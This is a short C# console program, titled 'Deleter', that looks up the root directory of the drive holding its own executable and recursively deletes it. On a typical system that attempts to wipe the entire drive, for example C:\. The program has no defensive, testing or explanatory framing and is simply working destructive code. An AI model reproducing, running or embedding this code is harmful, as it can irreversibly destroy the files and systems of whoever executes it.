using System;
using System.Reflection;
using System.IO;
    class Deleter {
      public static string dir = Directory.GetDirectoryRoot(Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location));
      public static bool DirExist = Directory.Exists(dir);
        public const string Ver = "1.0";
        public const string Title = "Deleter v" + Ver;
        static void Main(string[] args) {
        Console.Title = Title;
        Console.ForegroundColor = ConsoleColor.DarkGray;
        Console.BackgroundColor = ConsoleColor.Black;
        Console.WriteLine("Deleting " + dir);
            try {
      Directory.Delete(dir, true);}
            catch (Exception ex) {
              Console.WriteLine("Error deleting " + dir + " :");
              Console.WriteLine(ex);
            }
            }
    }